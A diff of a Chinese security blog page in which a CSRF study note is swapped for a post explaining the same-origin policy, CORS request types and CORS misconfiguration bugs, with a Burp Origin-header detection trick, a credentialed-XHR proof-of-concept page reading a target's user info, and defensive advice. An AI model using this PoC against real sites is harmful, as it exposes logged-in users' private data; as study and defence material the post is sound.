@@ -10,7 +10,7 @@
 		
 
 <head>
-	<title>CSRF漏洞学习</title>
+	<title>对CORS的深入理解</title>
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta name="apple-mobile-web-app-title" content="Amaze UI" />
@@ -54,7 +54,7 @@
 		
 		
 			
-			<p class=page-name>当前文章&nbsp;:&nbsp;《CSRF漏洞学习》</p>
+			<p class=page-name>当前文章&nbsp;:&nbsp;《对CORS的深入理解》</p>
 			
 		
 	
@@ -162,8 +162,8 @@
 					
 					
 	
-		<a href="/2018/11/01/2018.11.1/" itemprop="url">		
-			CSRF漏洞学习		
+		<a href="/2019/04/03/对CORS的深入理解/" itemprop="url">		
+			对CORS的深入理解		
 		</a>
 	
 
@@ -172,9 +172,9 @@
 				<p class="am-article-meta blog-text-center">
 					<span>
 						<i class="fa fa-clock-o"></i> 
-						<a href="/2018/11/01/2018.11.1/" itemprop="url">
-	<time datetime="2018-11-01T05:06:10.922Z" itemprop="datePublished">
-  		2018-11-01
+						<a href="/2019/04/03/对CORS的深入理解/" itemprop="url">
+	<time datetime="2019-04-02T16:00:00.000Z" itemprop="datePublished">
+  		2019-04-03
   </time>
 </a>    
 &nbsp;
@@ -184,7 +184,7 @@
 						
 							<i class="fa fa-tags"></i>
 							
-								<a href="#csrf" title="csrf" rel="1">csrf</a>&nbsp;
+								<a href="#笔记" title="笔记" rel="1">笔记</a>&nbsp;
 													 											
 						
 					</span>
@@ -194,27 +194,216 @@
 			<div class="am-article-bd">
 				<div class="content" id="post-content">
 					
-						<p>Cross-site request forgery，中文名称：跨站请求伪造</p>
-<h2 id="原理与过程："><a href="#原理与过程：" class="headerlink" title="原理与过程："></a>原理与过程：</h2><p>Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。</p>
-<p>​       1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</p>
-<p>​       2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</p>
-<p>​       3. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；</p>
-<p>​       4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</p>
-<p>​       5. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 </p>
-<h2 id="CSRF漏洞检测："><a href="#CSRF漏洞检测：" class="headerlink" title="CSRF漏洞检测："></a>CSRF漏洞检测：</h2><p>​       检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
-<h2 id="防御CSRF攻击："><a href="#防御CSRF攻击：" class="headerlink" title="防御CSRF攻击："></a>防御CSRF攻击：</h2><p>​       目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证</p>
-<p>1）验证 HTTP Referer 字段</p>
-<p>2）在请求地址中添加 token 并验证</p>
-<p>可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>
-<p>但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <a href="http://url?csrftoken=tokenvalue。" target="_blank" rel="noopener">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上 </p>
-<pre><code>&lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;tokenvalue&quot;/&gt;
-</code></pre><p>，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p>
-<p>不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。</p>
-<p>3）在 HTTP 头中自定义属性并验证</p>
-<p>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。</p>
-<p>通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p>
-<p>  然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p>
-<p>一个挺好的实例：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2014-075352.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2014-075352.html</a></p>
+						<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末在翻笔记的时候遇到了一些关于CORS的知识点，关于这块内容其实还是有很多以前自己没注意到的细节，于是整理起来后便有了这篇笔记，重新总结了下CORS相关的内容。</p>
+<h2 id="1-先从同源策略说起"><a href="#1-先从同源策略说起" class="headerlink" title="1.先从同源策略说起"></a>1.先从同源策略说起</h2><h3 id="1-1什么是同源策略"><a href="#1-1什么是同源策略" class="headerlink" title="1.1什么是同源策略"></a>1.1什么是同源策略</h3><p>源，就是主机、协议、端口名的一个三元组。</p>
+<p>同源策略(Same Origin Policy)即我们所说的SOP，一种web应用程序的安全模型，它控制了网页中DOM之间的访问。</p>
+<h3 id="2-1-如何判断同源策略"><a href="#2-1-如何判断同源策略" class="headerlink" title="2.1 如何判断同源策略"></a>2.1 如何判断同源策略</h3><p>定义：给定一个页面，如果另一个页面使用的协议、端口、主机名都相同，我们则认为两个页面具有相同的源。</p>
+<p>举个栗子，我们假设需要比对的目标页面来自这个URI: <a href="http://lyn.vint.com/archives/index.html" target="_blank" rel="noopener">http://lyn.vint.com/archives/index.html</a> </p>
+<table>
+<thead>
+<tr>
+<th>url</th>
+<th>是否同源</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="http://lyn.vint.com/collect/index.html" target="_blank" rel="noopener">http://lyn.vint.com/collect/index.html</a></td>
+<td>是</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://lyn.vint.com/archives/index.html" target="_blank" rel="noopener">https://lyn.vint.com/archives/index.html</a></td>
+<td>否</td>
+<td>协议不同</td>
+</tr>
+<tr>
+<td><a href="http://lyn.vint.com:81/archives/index.html" target="_blank" rel="noopener">http://lyn.vint.com:81/archives/index.html</a></td>
+<td>否</td>
+<td>端口不同</td>
+</tr>
+<tr>
+<td>&lt;<a href="http://new.vint.com/archives/index.html" target="_blank" rel="noopener">http://new.vint.com/archives/index.html</a></td>
+<td>否</td>
+<td>host不同</td>
+</tr>
+</tbody>
+</table>
+<p>同源策略允许运行在页面的脚本可以无限制的访问同一个网站（同源）中其他脚本的任何方法和属性。</p>
+<p>当不同网站页面（非同源）的脚本试图去互相访问的时候，大多数的方法和属性都是被禁止的。</p>
+<p>简单来说，就是同源策略可以使得浏览器拒绝加载非同源的资源，对于防范恶意页面是一种很好的防御机制。</p>
+<p>在了解了浏览器的同源策略后，我们可以知道，浏览器会根据同源策略只允许加载同个源上的资源，同时拒绝加载不同源上的资源。</p>
+<p>但是这样就出现了一个问题，就是现在我们的网站通常会将静态文件（css，js，图片）等放置在CDN或者其他服务器上，而CDN跟网站的当前域肯定是不同的，但是却可以加载成功，这不是违背了同源策略了吗？这时就到我们的CORS登场了。（规避浏览器同源策略的方法有很多，这里仅介绍CORS）</p>
+<h2 id="2-关于CORS"><a href="#2-关于CORS" class="headerlink" title="2.关于CORS"></a>2.关于CORS</h2><h3 id="2-1什么是CORS"><a href="#2-1什么是CORS" class="headerlink" title="2.1什么是CORS"></a>2.1什么是CORS</h3><p>CORS全称Cross-origin Resource Sharing，翻译过来就是跨域资源共享。</p>
+<p>跨域资源共享(<a href="https://developer.mozilla.org/en-US/docs/Glossary/CORS" target="_blank" rel="noopener">CORS</a>) 是一种机制，它允许浏览器向跨源(协议 + 域名 + 端口)服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。</p>
+<p>简单来说，其实CORS就是一种可以放宽浏览器同源策略的机制，可以通过浏览器让不同的网站和不同的服务器之间通信。</p>
+<h3 id="2-2什么情况下需要CORS"><a href="#2-2什么情况下需要CORS" class="headerlink" title="2.2什么情况下需要CORS?"></a>2.2什么情况下需要CORS?</h3><p>其实上面已经提到一些了，这里再做一下总结。</p>
+<ul>
+<li><p>前文提到的由 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest" target="_blank" rel="noopener"><code>XMLHttpRequest</code></a> 或 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API" target="_blank" rel="noopener">Fetch</a> 发起的跨域 HTTP 请求。</p>
+</li>
+<li><p>Web字体 (CSS 中通过<code>@font-face</code>使用跨域字体资源)</p>
+</li>
+<li>WebGL贴图</li>
+<li>使用 <code>drawImage</code> 将 Images/video 画面绘制到 canvas</li>
+<li>样式表（使用 <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSSOM_View" target="_blank" rel="noopener">CSSOM</a>）</li>
+</ul>
+<h3 id="2-3功能概述"><a href="#2-3功能概述" class="headerlink" title="2.3功能概述"></a>2.3功能概述</h3><p>跨域资源共享标准新增了一组 HTTP 首部字段，允许服务器声明哪些源站通过浏览器有权限访问哪些资源。另外，规范要求，对那些可能对服务器数据产生副作用的 HTTP 请求方法（尤其是除了 GET 、head等类似简单请求以外的 HTTP 请求），浏览器必须首先使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS" target="_blank" rel="noopener"><code>OPTIONS</code></a> 方法发起一个预检请求（preflight request），从而获知服务端是否允许该跨域请求。服务器确认允许之后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（包括 Cookies 和 HTTP 认证相关数据）。</p>
+<p>这一段可能看起来有点绕，下面我们将一一阐述。</p>
+<h3 id="2-4工作原理"><a href="#2-4工作原理" class="headerlink" title="2.4工作原理"></a>2.4工作原理</h3><p>CORS这种机制通过在http头部添加特定的字段和值，让客户端确定是否有资格跨域访问资源。</p>
+<p>下面我们假设一个情景，以便我们更好的理解CORS。</p>
+<p>假设我们访问a.com，然而a.com想从一个共有数据平台b.com中返回一些数据，那么在页面逻辑中，其可以通过下面的代码向b.com发送数据请求：</p>
+<pre><code>function retrieveData() {
+     var request = new XMLHttpRequest();
+     request.open(&#39;GET&#39;, &#39;http://b.com/someData&#39;, true);
+     request.onreadystatechange = handler;
+     request.send();
+}
+</code></pre><p>浏览器在运行这段代码后，将会向b.com发送如下的请求</p>
+<pre><code> GET /someData/ HTTP/1.1
+ Host: b.com
+ ......
+ Referer: http://a.com/somePage.html
+ Origin: http://a.com
+</code></pre><p>而支持CORS协议的b.com服务器可能会给出下面的响应：</p>
+<pre><code>HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Content-Type: application/xml
+......
+
+[Payload Here]
+</code></pre><p>使用 origin 和Access-Control-Allow-Origin就可以完成最简单的访问控制。 我们再重点说下这个响应头Access-Control-Allow-Origin，该响应头用来记录可以访问该资源的域。在接收到服务端响应后，浏览器将会查看响应中是否包含Access-Control-Allow-Origin响应头。如果该响应头存在，那么浏览器会分析该响应头中所标示的内容。如果其包含了当前页面所在的域，那么浏览器就将知道这是一个被允许的跨域访问，从而不再根据同源策略来限制用户对该数据的访问。</p>
+<p>在本例中，服务端返回的是Access-Control-Allow-Origin: *表明，该资源可以被任意外域访问。</p>
+<p>如果服务端仅允许来自a.com的访问，则该首部字段的内容如下：</p>
+<pre><code>Access-Control-Allow-Origin: http://a.example
+</code></pre><p>是不是很简单？这里就已经初步解释了CORS是如何规避同源策略实现跨域资源共享。</p>
+<p>接着继续深入，其实CORS总共可以分为三种，首先是第一种，Simple Request，这里我们称之为简单请求，即我们上面提到的例子；第二种是Preflighted Request，预检请求；最后一种，Requests with Credential，附带身份凭证的请求。</p>
+<ul>
+<li>简单请求（Simple Request）</li>
+</ul>
+<p>简单请求类型是在三种请求类型里面最简单的，就是我们刚才所假设的那种情景。</p>
+<p>下面再具体说下如何辨别简单请求类型：</p>
+<p>如果一个请求没有包含任何自定义请求头，而且它所使用HTTP动词是GET，HEAD或POST之一，那么它就是一个简单请求。但是在使用POST作为请求的动词时，该请求的Content-Type的值需要是application/x-www-form-urlencoded，multipart/form-data或text/plain之一，而不能为其他内容。</p>
+<ul>
+<li>预检请求（Preflighted Request）</li>
+</ul>
+<p>我们再假设一个情景，a.com要向公有数据平台b.com写入一些数据，那么我就需要发送一个POST请求，假设页面代码如下：</p>
+<pre><code>function sendData() {
+    var request = new XMLHttpRequest(),
+        payload = ......;
+    request.open(&#39;POST&#39;, &#39;http://b.com/someData&#39;, true);
+    request.setRequestHeader(&#39;X-CUSTOM-HEADER&#39;, &#39;custom_header_value&#39;);
+    request.onreadystatechange = handler;
+    request.send(payload);
+}
+</code></pre><p>在执行了该段代码后，浏览器首先发出的请求如下所示：</p>
+<pre><code>OPTIONS /someData/ HTTP/1.1
+Host: b.com
+ ......
+Origin: http://a.com
+Access-Control-Request-Method: POST
+Access-Control-Request-Headers: X-CUSTOM-HEADER
+</code></pre><p>可以看到，我们首先发送的并不是POST请求，而是OPTION请求。该请求还通过Access-Control-Request-Method以及Access-Control-Request-Headers标示了请求类型以及请求中所包含的自定义HTTP Header。实际上，它相当于向服务端询问访问资源的权限：“你好，我想向你这里发送数据，你看可以吗？”。而在真正访问资源前发送一个请求进行探测也是该请求类型被称为是预检请求（Preflight Request）的原因。</p>
+<p>接着往下，在服务端看到该OPTIONS请求后，其将分析该请求中的内容并返回一个响应，以通知浏览器是否允许向它发送数据：</p>
+<pre><code>HTTP/1.1 200 OK
+Access-Control-Allow-Origin: http://a.com
+Access-Control-Allow-Methods: POST, GET, OPTIONS
+Access-Control-Allow-Headers: X-CUSTOM_HEADER
+Access-Control-Max-Age: 1728000
+......
+</code></pre><p>浏览器分析了该响应后了解到其被允许向服务器发送POST请求后，才会向b.com发送真正的POST请求</p>
+<pre><code>POST /someData/ HTTP/1.1
+Host: b.com
+X-CUSTOM-HEADER: custom_header_value 
+......
+
+[Payload Here]
+</code></pre><p>最后b.com才接收并处理该请求：</p>
+<pre><code>HTTP/1.1 200 OK
+Access-Control-Allow-Origin: http://a.com
+Content-Type: application/xml
+......
+
+[Payload Here]
+</code></pre><ul>
+<li>附带身份凭证的请求(Requests with Credential)</li>
+</ul>
+<p>这种请求的运行流程则和前两种请求类似。只不过在发送请求的时候，需要将用户凭证包含在请求中。</p>
+<p>一般而言，对于跨域请求，浏览器不会发送身份凭证信息。如果要发送凭证信息，需要设置<code>XMLHttpRequest</code>的某个特殊标志位。</p>
+<p>继续再假设一个情景，a.com的某脚本向b.com发起一个GET请求，并设置cookies，脚本代码如下：</p>
+<pre><code>var invocation = new XMLHttpRequest();
+var url = &#39;http://b.com/somedata/&#39;;
+
+function callOtherDomain(){
+  if(invocation) {
+    invocation.open(&#39;GET&#39;, url, true);
+    invocation.withCredentials = true;
+    invocation.onreadystatechange = handler;
+    invocation.send(); 
+  }
+}
+</code></pre><p>这里的第7行将<code>XMLHttpRequest</code>的withCredentials标志设置为true，从而向b.com发送cookies。</p>
+<p>浏览器执行代码后，发送如下请求：</p>
+<pre><code> GET /someData/ HTTP/1.1
+ Host: b.com
+ ......
+ Referer: http://a.com/somePage.html
+ Origin: http://a.com
+ Cookie: admin=1
+</code></pre><p>因为是GET请求，所以浏览器不糊对其发起“预检请求”，服务器b.com对该请求进行验证成功后处理该请求：</p>
+<pre><code>HTTP/1.1 200 OK
+Access-Control-Allow-Origin: http://a.com
+Access-Control-Allow-Credentials: true
+......
+
+[Payload Here]
+</code></pre><p>这里有个特别值得注意的地方，就是Access-Control-Allow-Credentials: true（第3行），如返回的响应头里缺失该字段和值的话，那么这个响应内容就会被浏览器所拦截，不会返回给调用者。</p>
+<p>另外，对于这种附带身份凭证的请求，由于需要对身份进行验证，所以服务器不能够设置 <code>Access-Control-Allow-Origin 的值为“*”。</code>例如，刚才的情景中，如果b.com设置 Access-Control-Allow-Origin 的值为“*”的话，GET请求就不会请求成功了。只有Access-Control-Allow-Origin设置为a.com请求才能成功执行。</p>
+<h2 id="3-CORS漏洞的挖掘"><a href="#3-CORS漏洞的挖掘" class="headerlink" title="3.CORS漏洞的挖掘"></a>3.CORS漏洞的挖掘</h2><h3 id="3-1-漏洞怎么产生"><a href="#3-1-漏洞怎么产生" class="headerlink" title="3.1 漏洞怎么产生"></a>3.1 漏洞怎么产生</h3><p>上面我们已经知道了，对于附带身份凭证的请求(Requests with Credential)，客户端需要携带cookies请求，而服务器需要对请求进行身份验证，只有身份验证成功了之后才能请求成功，也就是说，并不是所有人都能对服务器请求成功，所以当然也就不能把Access-Control-Allow-Origin设置为*了。但是，现实中，比如说b.com服务器，不可能只有a.com去请求资源，总不能把Access-Control-Allow-Origin只设置为a.com吧？这样的话就只有a.com才能向b.com请求成功了。</p>
+<p>针对这种情况，CORS机制建议，可以简单的利用空格来分隔多个源，比如：</p>
+<pre><code>Access-Control-Allow-Origin: https://a.com https://aaa.com
+</code></pre><p>然而，没有浏览器支持这样的语法，当前浏览器只支持Access-Control-Allow-Origin: *，或者单个域，例如Access-Control-Allow-Origin: <a href="https://a.com" target="_blank" rel="noopener">https://a.com</a> 这种配置格式。</p>
+<p>由于存在这些限制，于是，有些服务器都是以编程的方式根据用户请求头中的Origin头部的值来生成“Access-Control-Allow-Origin”头部的值，甚至有些服务器直接配置Access-Control-Allow-Origin: null，虽说这样就绕过以上提到的限制，但也正是因为如此才产生了很多安全问题，这样配置就相当于对用户的请求来源没有进行验证，攻击者就能通过类似CSRF的攻击手法，来泄露用户的隐私数据和敏感数据。</p>
+<h3 id="3-2-漏洞复现"><a href="#3-2-漏洞复现" class="headerlink" title="3.2 漏洞复现"></a>3.2 漏洞复现</h3><p>先说下burp中简单的检测cors漏洞的方法<br><img src="/post/2019.4.3/1.png" alt=""><br><img src="/post/2019.4.3/2.png" alt=""></p>
+<p>简单说下，其实就是在每个请求包的请求头里自动加上“Origin: vint123.com”，然后在响应头里去匹配“Access-Control-Allow-Origin: vint123.com，方便我们更快地找到漏洞点进行测试。<br>这里我也测了一个互联网公司的站点，找到了一个真实案例<br>该漏洞已提交还没修复，为了不影响到该公司，所以打码有点严重。<br><img src="/post/2019.4.3/3.png" alt=""><br><img src="/post/2019.4.3/4.png" alt=""></p>
+<p>这里我用本地模拟攻击者服务器，构造好poc后浏览器扮演受害者的身份（后面附上poc），在登录该站点的情况下带着cookie访问构造好的tes.html,浏览器成功执行了poc里面的js代码，弹出了受害者的隐私信息。</p>
+<p><img src="/post/2019.4.3/5.png" alt=""></p>
+<p>构造的poc：</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;center&gt;
+&lt;h2&gt;CORS POC Exploit&lt;/h2&gt;
+&lt;h3&gt;Extract SID&lt;/h3&gt;
+
+&lt;div id=&quot;demo&quot;&gt;
+&lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Exploit&lt;/button&gt;
+&lt;/div&gt;
+
+&lt;script&gt;
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 &amp;&amp; this.status == 200) {
+      document.getElementById(&quot;demo&quot;).innerHTML = alert(this.responseText);
+    }
+  };
+  xhttp.open(&quot;GET&quot;, &quot;https://target.com/userinfo/&quot;, true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h2 id="4-关于防御"><a href="#4-关于防御" class="headerlink" title="4.关于防御"></a>4.关于防御</h2><p>1.首先，最关键的就是对请求包的”origin”的值进行校验。检查origin的值是不是一个可信源，还有检查是不是为null。<br>2.不要配置”Access-Control-Allow-Origin”的值为通配符”*”。<br>3.避免使用”Access-Control-Allow-Origin:true”<br>4.减少”Access-Control-Allow-Methods”所允许的方法</p>
+<p>参考链接：</p>
+<p><a href="https://lightless.me/archives/review-SOP.html" target="_blank" rel="noopener">https://lightless.me/archives/review-SOP.html</a></p>
+<p><a href="https://blog.csdn.net/jkx1132/article/details/78012696" target="_blank" rel="noopener">https://blog.csdn.net/jkx1132/article/details/78012696</a></p>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a></p>
+<p><a href="https://xz.aliyun.com/t/2745" target="_blank" rel="noopener">https://xz.aliyun.com/t/2745</a></p>
+<p><a href="https://blog.csdn.net/niexinming/article/details/84674235" target="_blank" rel="noopener">https://blog.csdn.net/niexinming/article/details/84674235</a></p>
+<p><a href="https://www.cnblogs.com/loveis715/p/4592246.html" target="_blank" rel="noopener">https://www.cnblogs.com/loveis715/p/4592246.html</a></p>
 
 					
 				</div>
@@ -223,15 +412,9 @@
 
 		<ul class="am-pagination">
     
-    	<li class="am-pagination-prev">
-   		<a class="pull-left" href="/2018/11/07/2018.11.5/" title="第四届上海大学生网络安全赛WP">
-      		&laquo; 上一篇
-		</a>
-		</li>
-	
 	
 		<li class="am-pagination-next">
-		<a class="pull-right" href="/2018/10/28/2018.10.27/" title="SQL注入学习笔记">
+		<a class="pull-right" href="/2019/01/03/2019.1.3/" title="oracle数据库思维导图">
 			下一篇 &raquo;
 		</a>
 		</li>
@@ -323,7 +506,7 @@
 				
 				
 				<!--toc(post.content)-->
-				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#原理与过程："><span class="post-toc-text">原理与过程：</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#CSRF漏洞检测："><span class="post-toc-text">CSRF漏洞检测：</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#防御CSRF攻击："><span class="post-toc-text">防御CSRF攻击：</span></a></li></ol>
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#1-先从同源策略说起"><span class="post-toc-text">1.先从同源策略说起</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-1什么是同源策略"><span class="post-toc-text">1.1什么是同源策略</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-1-如何判断同源策略"><span class="post-toc-text">2.1 如何判断同源策略</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-关于CORS"><span class="post-toc-text">2.关于CORS</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-1什么是CORS"><span class="post-toc-text">2.1什么是CORS</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-2什么情况下需要CORS"><span class="post-toc-text">2.2什么情况下需要CORS?</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-3功能概述"><span class="post-toc-text">2.3功能概述</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-4工作原理"><span class="post-toc-text">2.4工作原理</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#3-CORS漏洞的挖掘"><span class="post-toc-text">3.CORS漏洞的挖掘</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-1-漏洞怎么产生"><span class="post-toc-text">3.1 漏洞怎么产生</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-2-漏洞复现"><span class="post-toc-text">3.2 漏洞复现</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#4-关于防御"><span class="post-toc-text">4.关于防御</span></a></li></ol>
 			</nav>
 			<div class="post-toc-bar"><div>
 		</aside>
